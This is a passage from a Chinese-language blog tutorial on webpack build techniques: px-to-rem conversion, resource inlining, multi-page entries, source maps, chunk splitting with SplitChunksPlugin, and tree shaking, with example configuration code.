screen and (max-width: <span class=\"number\">350px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路二是用相对单位 rem，rem 是相对于页面根元素 html 的大小来确定其他元素的大小。使用 rem，条件一是动态设置 html 的 font-size，条件二是根据视觉稿编写具体元素的对应 px 的 rem 值。计算根元素的 font-size 值可以使用手淘的<a href=\"https://github.com/amfe/lib-flexible\" target=\"_blank\" rel=\"noopener\">lib-flexible</a>库，px 转成 rem 可以利用样式预编译库的类函数功能去实现，也可以利用构建工具去处理。推荐<code>lib-flexible</code>+<code>px2rem-loader</code>，示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// lib-flexible库代码</span></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/.css$/</span>,</span><br><span class=\"line\">    use: [</span><br><span class=\"line\">        <span class=\"string\">'css-loader'</span>,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            loader: <span class=\"string\">'px2rem-loader'</span>,</span><br><span class=\"line\">            options: &#123;</span><br><span class=\"line\">                remUnit: <span class=\"number\">75</span>,</span><br><span class=\"line\">                remPrecision: <span class=\"number\">8</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"静态资源内联\"><a href=\"#静态资源内联\" class=\"headerlink\" title=\"静态资源内联\"></a>静态资源内联</h2><p>资源内联意义有：页面框架的初始化脚本、上报相关打点、css 内联避免页面闪动和减少 http 网络请求数。</p>\n<h3 id=\"HTML-和-JS-内联\"><a href=\"#HTML-和-JS-内联\" class=\"headerlink\" title=\"HTML 和 JS 内联\"></a>HTML 和 JS 内联</h3><p>可以用 webpack 的 raw-loader 实现，示例如下（<a href=\"mailto:raw-loader@0.5.1\" target=\"_blank\" rel=\"noopener\">raw-loader@0.5.1</a>）：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    $&#123;require('raw-loader!./meta.html')&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">      $&#123;<span class=\"built_in\">require</span>(<span class=\"string\">'raw-loader!babel-loader!../../node_modules/lib-flexible/flexible.js'</span>)&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"root\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"CSS-内联\"><a href=\"#CSS-内联\" class=\"headerlink\" title=\"CSS 内联\"></a>CSS 内联</h3><p>用 webpack 的 style-loader</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">  rules: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      test: <span class=\"regexp\">/\\.scss$/</span>,</span><br><span class=\"line\">      use: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">\"style-loader\"</span>,</span><br><span class=\"line\">          options: &#123;</span><br><span class=\"line\">            insertAt: <span class=\"string\">\"top\"</span>, <span class=\"comment\">// 样式插入到&lt;head&gt;</span></span><br><span class=\"line\">            singleton: <span class=\"literal\">true</span> <span class=\"comment\">//将所有的style标签合并成一个</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"string\">\"css-loader\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"sass-loader\"</span></span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"小图片或者字体内联\"><a href=\"#小图片或者字体内联\" class=\"headerlink\" title=\"小图片或者字体内联\"></a>小图片或者字体内联</h3><p>用 webpack 的 url-loader</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">  rules: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      test: <span class=\"regexp\">/.(png|jpg|gif|jpeg)$/</span>,</span><br><span class=\"line\">      use: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">\"url-loader\"</span>,</span><br><span class=\"line\">          options: &#123;</span><br><span class=\"line\">            limit: <span class=\"number\">10240</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      test: <span class=\"regexp\">/.(woff|woff2|eot|ttf|otf)$/</span>,</span><br><span class=\"line\">      use: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">\"url-loader\"</span>,</span><br><span class=\"line\">          options: &#123;</span><br><span class=\"line\">            limit: <span class=\"number\">10240</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"多页面应用打包通用方案\"><a href=\"#多页面应用打包通用方案\" class=\"headerlink\" title=\"多页面应用打包通用方案\"></a>多页面应用打包通用方案</h2><p>思路一，每个页面对应一个 entry，一个 html-webpack-plugin，缺点就是增删页面需要修改 webpack 配置文件。<br>思路二，动态获取 entry 和设置 html-webpack-plugin 数量，前提是约定各个页面文件结构，例如每个页面一个单独文件夹，每个入口文件名都为 index.js。示例如下：</p>\n<!-- webpack.config.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> glob = <span class=\"built_in\">require</span>(<span class=\"string\">\"glob\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">\"path\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> HtmlWebpackPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">\"html-webpack-plugin\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; CleanWebpackPlugin &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">\"clean-webpack-plugin\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> setMPA = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> entry = &#123;&#125;;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> htmlWebpackPlugins = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> entryFiles = glob.sync(path.join(__dirname, <span class=\"string\">\"./src/*/index.js\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Object</span>.keys(entryFiles).map(<span class=\"function\"><span class=\"params\">index</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> entryFile = entryFiles[index];</span><br><span class=\"line\">    <span class=\"keyword\">const</span> match = entryFile.match(<span class=\"regexp\">/src\\/(.*)\\/index\\.js/</span>);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> fileName = match &amp;&amp; match[<span class=\"number\">1</span>];</span><br><span class=\"line\">    entry[fileName] = entryFile;</span><br><span class=\"line\"></span><br><span class=\"line\">    htmlWebpackPlugins.push(</span><br><span class=\"line\">      <span class=\"keyword\">new</span> HtmlWebpackPlugin(&#123;</span><br><span class=\"line\">        template: path.join(__dirname, <span class=\"string\">`src/<span class=\"subst\">$&#123;fileName&#125;</span>/index.html`</span>),</span><br><span class=\"line\">        filename: <span class=\"string\">`<span class=\"subst\">$&#123;fileName&#125;</span>.html`</span>,</span><br><span class=\"line\">        chunks: [<span class=\"string\">\"vendors\"</span>, fileName],</span><br><span class=\"line\">        inject: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        minify: &#123;</span><br><span class=\"line\">          html5: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          collapseWhitespace: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          preserveLineBreaks: <span class=\"literal\">false</span>,</span><br><span class=\"line\">          minifyCSS: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          minifyJS: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          removeComments: <span class=\"literal\">false</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    entry,</span><br><span class=\"line\">    htmlWebpackPlugins</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; entry, htmlWebpackPlugins &#125; = setMPA();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  entry: entry,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    path: path.join(__dirname, <span class=\"string\">\"dist\"</span>),</span><br><span class=\"line\">    filename: <span class=\"string\">\"[name]_[chunkhash:8].js\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  plugins: [<span class=\"keyword\">new</span> CleanWebpackPlugin()].concat(htmlWebpackPlugins)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这个示例中使用了 npm 包<code>glob</code>来读文件，当然也可以直接用 node 的 fs 模块实现，或者其他功能包。</p>\n<h2 id=\"使用-source-map\"><a href=\"#使用-source-map\" class=\"headerlink\" title=\"使用 source map\"></a>使用 source map</h2><p>作用是通过 source map 定位到源代码，主要用于调试，所以开发环境开启，线上环境关闭。source map 类型很多，重点是掌握几个关键字的含义，然后各种类型含义也只是关键字的组合。关键字含义如下：</p>\n<ul>\n<li>source map: 产生.map 文件</li>\n<li>eval: 使用 eval 包裹模块代码</li>\n<li>cheap: 不包含列列信息</li>\n<li>inline: 将.map 作为 DataURI 嵌入，不不单独生成.map 文件</li>\n<li>module:包含 loader 的 sourcemap</li>\n</ul>\n<h2 id=\"提取页面公共资源\"><a href=\"#提取页面公共资源\" class=\"headerlink\" title=\"提取页面公共资源\"></a>提取页面公共资源</h2><h3 id=\"基础库分离\"><a href=\"#基础库分离\" class=\"headerlink\" title=\"基础库分离\"></a>基础库分离</h3><p>将 react、react-dom 基础包通过 cdn 引入，不打入 bundle 中，可以使用<code>html-webpackexternals-plugin</code>实现：</p>\n<!-- webpack.config.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> HtmlWebpackExternalsPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">\"html-webpack-externals-plugin\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> HtmlWebpackExternalsPlugin(&#123;</span><br><span class=\"line\">      externals: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">module</span>: <span class=\"string\">\"react\"</span>,</span><br><span class=\"line\">          entry: <span class=\"string\">\"https://unpkg.com/react@16/umd/react.production.min.js\"</span>,</span><br><span class=\"line\">          global: <span class=\"string\">\"React\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">module</span>: <span class=\"string\">\"react-dom\"</span>,</span><br><span class=\"line\">          entry:</span><br><span class=\"line\">            <span class=\"string\">\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"</span>,</span><br><span class=\"line\">          global: <span class=\"string\">\"ReactDOM\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"root\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react@16/umd/react.production.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-SplitChunksPlugin-进行公共脚本分离\"><a href=\"#利用-SplitChunksPlugin-进行公共脚本分离\" class=\"headerlink\" title=\"利用 SplitChunksPlugin 进行公共脚本分离\"></a>利用 SplitChunksPlugin 进行公共脚本分离</h3><p>利用 SplitChunksPlugin 分离基础包</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  optimization: &#123;</span><br><span class=\"line\">    splitChunks: &#123;</span><br><span class=\"line\">      cacheGroups: &#123;</span><br><span class=\"line\">        commons: &#123;</span><br><span class=\"line\">          test: <span class=\"regexp\">/(react|react-dom)/</span>, <span class=\"comment\">//匹配出需要分离的包</span></span><br><span class=\"line\">          name: <span class=\"string\">\"vendors\"</span>,</span><br><span class=\"line\">          chunks: <span class=\"string\">\"all\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>利用 SplitChunksPlugin 分离页面公共文件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  optimization: &#123;</span><br><span class=\"line\">    splitChunks: &#123;</span><br><span class=\"line\">      minSize: <span class=\"number\">0</span>, <span class=\"comment\">//分离的包体积的大小</span></span><br><span class=\"line\">      cacheGroups: &#123;</span><br><span class=\"line\">        commons: &#123;</span><br><span class=\"line\">          name: <span class=\"string\">\"commons\"</span>,</span><br><span class=\"line\">          chunks: <span class=\"string\">\"all\"</span>,</span><br><span class=\"line\">          minChunks: <span class=\"number\">2</span> <span class=\"comment\">//设置最小引用次数为2次</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tree-shaking-的使用和原理分析\"><a href=\"#tree-shaking-的使用和原理分析\" class=\"headerlink\" title=\"tree shaking 的使用和原理分析\"></a>tree shaking 的使用和原理分析</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>1 个模块可能有多个方法，只要其中的某个方法使用到了，则整个文件都会被打到<br>bundle 里面去，tree shaking 就是只把用到的方法打入 bundle，没用到的方法会在<br>uglify 阶段被擦除掉。</p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><p>webpack4.x 在 mode 设置为 production 时默认开启，webpack3.x 与 webpack2.x 在.babelrc 里设置 modules: false 即可。</p>\n<h3 id=\"DCE-Dead-code-elimination\"><a href=\"#DCE-Dead-code-elimination\" class=\"headerlink\" title=\"DCE (Dead code elimination)\"></a>DCE (Dead code elimination)</h3><p>在保持代码运行结果不变的前提下，去除无用的代码。</p>\n<ul>\n<li>代码执行的结果不会被用到</li>\n<li>代码不会被执行，不可到达</li>\n<li>代码只会影响死变量（只写不不读）<br>tree shaking 是 DCE 的一种方式，它可以在打包时忽略没有用到的代码。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'这段代码永远不会执行’);</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>利用 ES6 模块的特点（只能作为模块顶层的语句句出现、import 的模块名只能是字符串串常量和引入的模块不可改变），在打包阶段对静态代码进行 AST 语法分析，对有用和无用的模块打上不同标签，“uglify”阶段删除无用代码。</p>\n<h3 id=\"局限性\"><a href=\"#局限性\" class=\"headerlink\" title=\"局限性\"></a>局限性</h3><p>1，只能是静态声明和引用的 ES6 模块，不能是动态引入和声明的；</p>\n<p>在打包阶段对冗余代码进行删除，就需要 webpack 需要在打包阶段确定模块文件的内部结构，而 ES 模块的引用和输出必须出现在文件结构的第一级（’import’ and ‘export’ may only appear at the top level），否则会报错。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack编译时会报错</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (condition) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">import</span> module1 <span class=\"keyword\">from</span> <span class=\"string\">\"./module1\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">import</span> module2 <span class=\"keyword\">from</span> <span class=\"string\">\"./module2\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而 CommonJS 模块支持动态结构的，所以不能对 CommonJS 模块进行 tree-shaking 处理。</p>\n<p>2，只能处理模块级别，不能处理函数级别的冗余；<br>因为 webpack 的 tree-shaking 是基于模块间的依赖关系，所以并不能对模块内部自身的无用代码进行删除。</p>\n<p>3，只能处理 JS 相关冗余代码，不能处理 CSS 冗余代码。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《极客时间》</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>本文介绍的 webpack 用法有：自动清理构建目录、自动补齐 CSS3 前缀、移动端 CSS 中的 px 自动转成 rem、静态资源内联、多页面应用打包通用方案、使用 source map、提取页面公共资源和tree shaking 的使用和原理分析。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"自动清理构建目录\"><a href=\"#自动清理构建目录\" class=\"headerlink\" title=\"自动清理构建目录\"></a>自动清理构建目录</h2><p>若频次很低，我们可以直接手动删除已构建文件。但是实际中我们要经常执行构建命令，这时候就需要自动清理构建目录文件了。思路一是用<code>npm scripts</code>，直接用系统命令：<code>rm -rf ./dist &amp;&amp; webpack</code>，或者用 npm 包 rimraf：<code>rimraf ./dist &amp;&amp; webpack</code>。思路二是用 webpack 插件<code>clean-webpack-plugin</code>，使用很简单，安装配置下即可，完成后每次构建就会自动清理已构建的目录文件。</p>\n<!-- package.json -->\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"scripts\": &#123;</span><br><span class=\"line\">  \"build\": \"rm -rf ./dist &amp;&amp; webpack --config webpack.prod.js\",</span><br><span class=\"line\">  // \"build\": \"rimraf ./dist &amp;&amp; webpack --config webpack.prod.js\",</span><br><span 